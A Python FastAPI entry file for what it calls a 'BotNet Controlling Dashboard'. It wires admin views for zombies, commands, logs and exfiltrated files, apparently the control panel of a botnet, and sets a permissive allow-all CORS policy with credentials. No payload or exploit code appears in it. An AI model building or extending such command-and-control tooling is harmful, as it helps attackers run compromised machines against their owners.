import os
from contextlib import asynccontextmanager
from fastapi import FastAPI
from sqladmin.templating import Jinja2Templates
from starlette.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from apps.user.admin import UserAdmin
from apps.zombie.admin import ZombieAdmin, CommandAdmin, LogAdmin, FileAdmin, NotificationAdmin
from config.dashboard_security import authentication_backend
from config.database import create_all_tables, engine
from apps.routes import main_router
from sqladmin import Admin


@asynccontextmanager
async def create_db(app: FastAPI):
    await create_all_tables()
    print("[+] All tables created")
    yield


app = FastAPI(
    title="BotNet Dashboard",
    description="BotNet Controlling Dashboard",
    version="1.0.0",

    lifespan=create_db,

)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
admin = Admin(app, engine, base_url="/admin", authentication_backend=authentication_backend, )
# Add it to the dashboard
admin.add_view(UserAdmin)
admin.add_view(ZombieAdmin)
admin.add_view(CommandAdmin)
admin.add_view(LogAdmin)
admin.add_view(FileAdmin)
admin.add_view(NotificationAdmin)

# admin
app.include_router(main_router)

templates = Jinja2Templates(directory="templates")

print(f"Current Directory: {os.getcwd()}")
print(f"Media folder exists: {os.path.exists('media')}")

app.mount("/static", StaticFiles(directory="media"), name="static")

if __name__ == "__main__":
    import uvicorn

    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=True)
